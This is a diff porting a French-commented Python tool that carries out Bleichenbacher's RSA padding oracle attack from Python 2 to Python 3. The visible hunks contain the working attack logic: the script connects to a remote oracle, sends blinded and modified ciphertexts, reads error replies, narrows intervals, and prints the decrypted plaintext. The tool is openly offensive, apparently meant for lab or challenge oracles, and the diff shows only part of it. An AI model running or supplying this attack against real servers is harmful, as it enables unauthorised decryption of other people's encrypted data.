@@ -1,4 +1,4 @@
-#!/usr/bin/python2.7
+#!/usr/bin/env python
 # -*- coding: utf-8 -*-
 
 # RSA Padding Oracle Attack
@@ -11,6 +11,7 @@
 import socket
 import random
 import sys
+import codecs
 
 class Bleichenbacher(object):
 
@@ -18,13 +19,13 @@ class Bleichenbacher(object):
 
     # Accueil
 
-    print "\n"
-    print "\t~~~~~~~~~~~~~~~~~~~~~~~~~"
-    print "\tAttaque de Bleichenbacher"
-    print "\t       Zweisamkeit       "
-    print "\t    Licence GNU GPL v3   "
-    print "\t~~~~~~~~~~~~~~~~~~~~~~~~~"
-    print "\n"
+    print ("\n")
+    print ("\t~~~~~~~~~~~~~~~~~~~~~~~~~")
+    print ("\tAttaque de Bleichenbacher")
+    print ("\t       Zweisamkeit       ")
+    print ("\t    Licence GNU GPL v3   ")
+    print ("\t~~~~~~~~~~~~~~~~~~~~~~~~~")
+    print ("\n")
 
   # Augmente nombre appels recursifs
 
@@ -40,15 +41,15 @@ class Bleichenbacher(object):
 
     sock.connect(server)
 
-    return sock
+    return (sock)
 
   # Premier entier inférieur ou égal / supérieur ou égal à  x/y
 
   def Defaut(self, x,y):
-    return x / y
+    return (x // y)
 
   def Exces(self,x,y):
-    return self.Defaut(x,y) + (x % y != 0)
+    return (self.Defaut(x,y) + (x % y != 0))
 
   # Génération des clés :
 
@@ -83,8 +84,8 @@ class Bleichenbacher(object):
 
     cryptogramme = bytearray.fromhex('{:0512x}'.format(y))
     self.sock.send(cryptogramme)
-    reponse = self.sock.recv(1024)
-    return (reponse.find(self.error) == -1)
+    reponse = self.sock.recv(1024).decode('utf-8')
+    return (reponse.find((self.error).replace('"','')) == -1)
 
   # Recherche de si dans le cas où l'on a plusieurs encadrements
 
@@ -95,7 +96,7 @@ class Bleichenbacher(object):
       if (self.Oracle(c1)):
         break # On a trouvé le bon si
       si += 1
-    return si
+    return (si)
 
   # Recherche optimisée de si dans le cas où l'on n'a qu'un seul encadrement
 
@@ -110,7 +111,7 @@ class Bleichenbacher(object):
           break # On a trouvé si
       if not found:
         r  += 1
-    return si
+    return (si)
 
   # Calcul et affinage des intervalles
 
@@ -121,7 +122,7 @@ class Bleichenbacher(object):
       newb = min(b,self.Defaut(self.B3 - 1 + r*self.n, si))  
       if newa <= newb:
         M |= set([(newa, newb)])
-    return M
+    return (M)
 
   # Pour déterminer le plaintext à partir de la borne 
 
@@ -131,15 +132,15 @@ class Bleichenbacher(object):
       if a == 0 and b == 0:
         return (0, 0, 0)
       if b == 0:
-        return (a/abs(a), 0, abs(a))
+        return (a//abs(a), 0, abs(a))
       (u, v, p) = self.Bezout(b, a%b)
-      return (v, (u - v*(a/b)), p)
+      return (v, (u - v*(a//b)), p)
    
   # Inverse modulaire
 
   def Inv_mod(self,x, m):
       (u, _, p) = self.Bezout(x, m)
-      return u % abs(m)
+      return (u % abs(m))
 
   # Iterations
 
@@ -156,12 +157,12 @@ class Bleichenbacher(object):
     elif (len(M) == 1) : # S'il n'y a qu'un seul intervalle encadrant le plaintext # Étape 4
       (a,b)=(list(M)[0][0],list(M)[0][1])
       if (a==b): # Si l'amplitude de l'unique intervalle est nulle, on a le plaintext
-        print "\tConstruction et affinage des encadrements terminés.\n"
+        print ("\tConstruction et affinage des encadrements terminés.\n")
         plaintext = (a * self.Inv_mod(self.s0,self.n)) % self.n
-        print "\tLe message en clair est : \n\n", hex(plaintext)[3:].replace('L','').decode('hex') # Renvoie le plaintext
-        print "\n\tFin de l'attaque.\n"
+        print ("\tLe message en clair est : \n\n", codecs.decode(hex(plaintext)[3:].replace('L',''),"hex_codec").decode('utf-8','ignore')) # Renvoie le plaintext
+        print ("\n\tFin de l'attaque.\n")
         self.sock.close()
-        print "\tConnexion cloturée.\n"
+        print ("\tConnexion cloturée.\n")
         exit()
       else : # Si l'on n'a qu'un intervalle d'amplitude non nulle, on utilise l'optimisation binaire pour trouver si plus rapidement # Étape 2.c
         si = self.Recherche_Binaire(si,a,b) # On recherche le prochain si de manière optimisée
@@ -180,11 +181,11 @@ class Bleichenbacher(object):
     self.c = c
     self.e = e
 
-    print "\tÉtablissement de la connexion à l'Oracle..."
+    print ("\tÉtablissement de la connexion à l'Oracle...")
 
     sock = self.Connect(host, port)
 
-    print "\tConnexion à l'Oracle établie.\n"
+    print ("\tConnexion à l'Oracle établie.\n")
 
     self.sock = sock
 
@@ -192,9 +193,9 @@ class Bleichenbacher(object):
 
     # Blinding - Étape 1
 
-    print "\tLancement de l'attaque...\n"
+    print ("\tLancement de l'attaque...\n")
 
-    print "\tBrouillage en cours..."
+    print ("\tBrouillage en cours...")
 
     maximum=10**10 # Valeur arbitraire
     s0 = random.randint(1,maximum)
@@ -207,7 +208,7 @@ class Bleichenbacher(object):
       self.s0 = s0
       self.c0 = c0
 
-    print "\tBrouillage terminé.\n"
+    print ("\tBrouillage terminé.\n")
     #print "s0 random utilisé : ", s0
 
     k = 256 # Taille du module en bytes
@@ -223,7 +224,7 @@ class Bleichenbacher(object):
 
     # Initialisation - Étape 2.a
 
-    print "\tConstruction et affinage des encadrements en cours..."
+    print ("\tConstruction et affinage des encadrements en cours...")
 
     si = self.Exces(n,3*B) # On initialise si
     si = self.Recherche(si) # On cherche le premier si valable
